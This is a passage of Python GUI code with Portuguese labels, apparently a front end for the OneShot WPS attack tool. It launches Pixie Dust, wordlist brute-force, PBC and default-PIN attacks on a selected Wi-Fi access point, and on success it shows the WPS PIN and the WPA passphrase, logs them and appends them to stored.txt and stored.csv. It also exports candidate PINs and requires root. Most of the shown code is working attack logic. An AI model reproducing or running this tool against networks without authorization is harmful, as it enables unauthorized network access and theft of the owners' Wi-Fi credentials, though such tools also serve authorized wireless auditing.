            self.companion = Companion(iface, callback_log=lambda m, l: self.log(m, l), bssid=bssid)

            if use_wordlist and self.wordlist_pins:
                for idx, wl_pin in enumerate(self.wordlist_pins):
                    if not self._running: break
                    self.log('[{}/{}] Testando PIN: {}'.format(idx+1, len(self.wordlist_pins), wl_pin), 'info')
                    result = self.companion.single_connection(bssid, wl_pin, pixiemode=False)
                    if result:
                        self.result_queue.put(('success', result))
                        if self.var_save.get(): self._save_creds(result)
                        self.result_queue.put(('done', None)); return
                    if delay > 0: time.sleep(delay)
                self.log('Wordlist esgotada.', 'error')
                self.result_queue.put(('done', None)); return
            elif brute:
                result = self.companion.single_connection(bssid, pin, pixiemode=True)
            elif pbc:
                result = self.companion.single_connection(bssid, pbc_mode=True)
            else:
                if not pin:
                    suggested = self.companion.generate_pins_list(bssid)
                    if suggested:
                        pin = suggested[0]['pin']
                        self.log('Usando PIN provavel: {} ({})'.format(pin, suggested[0]['name']), 'highlight')
                result = self.companion.single_connection(bssid, pin, pixiemode=pixie,
                    showpixiecmd=self.var_show_cmd.get(), pixieforce=self.var_pixie_force.get())
            if result:
                self.result_queue.put(('success', result))
                if self.var_save.get(): self._save_creds(result)
            else: self.result_queue.put(('fail', None))
        except Exception as e:
            self.log('Erro no ataque: {}'.format(str(e)), 'error')
            import traceback; self.log(traceback.format_exc(), 'debug')
            self.result_queue.put(('done', None))
        finally:
            if self.companion: self.companion.cleanup(); self.companion = None
            if not self.var_loop.get() or not self._running: self.result_queue.put(('done', None))

    def _process_result(self, result):
        status, data = result
        if status == 'success':
            self._show_result_success(data)
            self.log('=== CREDENCIAIS OBTIDAS! ===', 'success')
            self.log('WPS PIN: {}'.format(data.get('pin', '?')), 'highlight')
            self.log('WPA PSK SENHA: {}'.format(data.get('psk', '?')), 'success')
            self.log('ESSID:   {}'.format(data.get('essid', '?')), 'success')
        elif status == 'fail':
            self._show_result_fail()
            self.log('Ataque falhou - PIN incorreto ou timeout', 'error')
        self._running = False
        self.btn_attack.config(state=tk.NORMAL, text='Iniciar Ataque')
        self.btn_stop.config(state=tk.DISABLED)

    def _stop_attack(self):
        self._running = False
        if self.companion: self.companion.stop()
        self.log('Ataque interrompido pelo usuario', 'error')
        self.btn_attack.config(state=tk.NORMAL, text='Iniciar Ataque')
        self.btn_stop.config(state=tk.DISABLED)

    def _save_creds(self, data):
        try:
            if not os.path.exists(self.reports_dir): os.makedirs(self.reports_dir)
            filename = os.path.join(self.reports_dir, 'stored')
            dateStr = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
            bssid = data.get('bssid', '?'); essid = data.get('essid', '?')
            pin = data.get('pin', '?'); psk = data.get('psk', '?')
            with open(filename + '.txt', 'a', encoding='utf-8') as f:
                f.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK SENHA: {}\n\n'.format(dateStr, bssid, essid, pin, psk))
            writeHeader = not os.path.isfile(filename + '.csv')
            with open(filename + '.csv', 'a', newline='', encoding='utf-8') as f:
                writer = csv.writer(f, delimiter=';', quoting=csv.QUOTE_ALL)
                if writeHeader: writer.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
                writer.writerow([dateStr, bssid, essid, pin, psk])
            self.log('Credenciais salvas em stored.txt/.csv', 'success')
        except Exception as e: self.log('Erro ao salvar: {}'.format(str(e)), 'error')

    def _save_report(self):
        content = self.result_text.get(1.0, tk.END).strip()
        if not content: messagebox.showinfo('Info', 'Nenhum resultado'); return
        fname = filedialog.asksaveasfilename(defaultextension='.txt', filetypes=[('Texto', '*.txt')])
        if fname:
            with open(fname, 'w', encoding='utf-8') as f: f.write(content + '\n')
            self.log('Relatorio salvo em {}'.format(fname), 'success')

    def _poll_queues(self):
        try:
            while True: msg, level = self.log_queue.get_nowait(); self._process_log(msg, level)
        except queue.Empty: pass
        try: data = self.scan_queue.get_nowait(); self._process_scan(data)
        except queue.Empty: pass
        try: result = self.result_queue.get_nowait(); self._process_result(result)
        except queue.Empty: pass
        self.root.after(100, self._poll_queues)

    def _on_close(self):
        if self._running:
            if not messagebox.askyesno('Confirma', 'Ataque em andamento. Sair?'): return
            self._stop_attack()
        if self.companion: self.companion.cleanup()
        self.root.destroy()


    def _save_pins_to_txt(self):
        """Salva todos os PINs retornados, um por linha, sem pular nenhum."""
        selection = self.tree.selection()

        if not selection:
            if self.selected_bssid:
                bssid = self.selected_bssid
            else:
                messagebox.showwarning(
                    "Aviso",
                    "Selecione uma rede primeiro!"
                )
                return
        else:
            item = self.tree.item(selection[0])
            bssid = item["values"][0]

        try:
            pins = WPSpin().getAll(bssid, get_static=True)

            if not pins:
                messagebox.showwarning(
                    "Aviso",
                    "Nenhum PIN encontrado."
                )
                return

            fname = filedialog.asksaveasfilename(
                defaultextension=".txt",
                filetypes=[("Arquivo de Texto", "*.txt")],
                initialfile=f"PINs_{bssid.replace(':', '')}.txt",
                title="Salvar PINs"
            )

            if not fname:
                return

            with open(fname, "w", encoding="utf-8", newline="\n") as f:
                for item in pins:
                    pin = str(item.get("pin", "")).strip()

                    # Não grava registros vazios
                    if pin:
                        f.write(pin + "\n")

            self.log(
                f"PINs salvos com sucesso em: {fname}",
                "success"
            )

            messagebox.showinfo(
                "Sucesso",
                f"PINs salvos com sucesso!\n\nLocal:\n{fname}"
            )

        except Exception as e:
            messagebox.showerror(
                "Erro",
                f"Não foi possível salvar o arquivo:\n{str(e)}"
            )

# ============================================================
# UTILITARIOS
# ============================================================

def ifaceUp(iface, down=False):
    if not IS_LINUX: return False
    action = 'down' if down else 'up'
    return subprocess.run('ip link set {} {}'.format(iface, action), shell=True).returncode == 0


def check_dependencies():
    if IS_LINUX:
        missing = []
        for cmd in ['iw', 'wpa_supplicant', 'pixiewps']:
            if subprocess.run('which {}'.format(cmd), shell=True, stdout=subprocess.DEVNULL).returncode != 0:
                missing.append(cmd)
        if missing:
            sys.stderr.write('[AVISO] Faltam: {}\n'.format(', '.join(missing)))
            sys.stderr.write('Instale: apt install iw wpaspy pixiewps\n')


# ============================================================
# MAIN
# ============================================================

if __name__ == '__main__':
    if sys.hexversion < 0x03060F0:
        sys.stderr.write('Requer Python 3.6+\n'); sys.exit(1)
    if IS_LINUX and os.getuid() != 0:
        sys.stderr.write(colorize('[!] Execute como root (sudo)\n', ANSI_RED, bold=True)); sys.exit(1)
    check_dependencies()
    root = tk.Tk()
    app = OneShotGUI(root)
    root.mainloop()
